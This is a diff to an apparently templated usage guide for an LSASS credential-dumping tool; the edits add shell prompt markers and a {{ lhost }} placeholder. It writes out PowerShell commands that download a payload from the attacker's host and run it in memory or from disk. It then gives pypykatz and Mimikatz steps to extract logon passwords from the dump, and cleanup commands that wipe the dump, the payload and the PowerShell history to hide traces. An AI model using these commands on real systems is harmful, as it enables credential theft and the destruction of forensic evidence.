@@ -63,25 +63,25 @@ output:
     Step 1: Execute Dumper on Target
 
     In-memory execution (no file drop):
-    $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP/{{ output_file }}')
+    $ $data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}')
     $assem = [System.Reflection.Assembly]::Load($data)
     [Program]::Main("{{ dump_path }}".Split())
 
     Traditional execution:
-    Invoke-WebRequest -Uri "http://YOUR_IP/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }}
+    $ Invoke-WebRequest -Uri "http://{{ lhost }}/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }}
 
     With custom dump path:
-    Invoke-WebRequest -Uri "http://YOUR_IP/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }} C:\\Temp\\lsass_backup.dmp
+    $ Invoke-WebRequest -Uri "http://{{ lhost }}/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }} C:\\Temp\\lsass_backup.dmp
 
     Step 2: Extract Credentials
 
     On attacker machine (Linux with pypykatz):
-    pypykatz lsa minidump lsass.dmp
+    $ pypykatz lsa minidump lsass.dmp
 
     On attacker machine (Windows with Mimikatz):
-    mimikatz.exe
-    sekurlsa::minidump lsass.dmp
-    sekurlsa::logonPasswords full
+    $ mimikatz.exe
+    $ sekurlsa::minidump lsass.dmp
+    $ sekurlsa::logonPasswords full
 
     Notes:
 
@@ -113,7 +113,7 @@ output:
 
     Securely delete dump file and payload:
     sdelete64 -p 7 {{ dump_path }}
-    Remove-Item {{ dump_path }} -Force
-    Remove-Item {{ output_file }} -Force
-    Clear-History
-    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
+    $ Remove-Item {{ dump_path }} -Force
+    $ Remove-Item {{ output_file }} -Force
+    $ Clear-History
+    $ Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
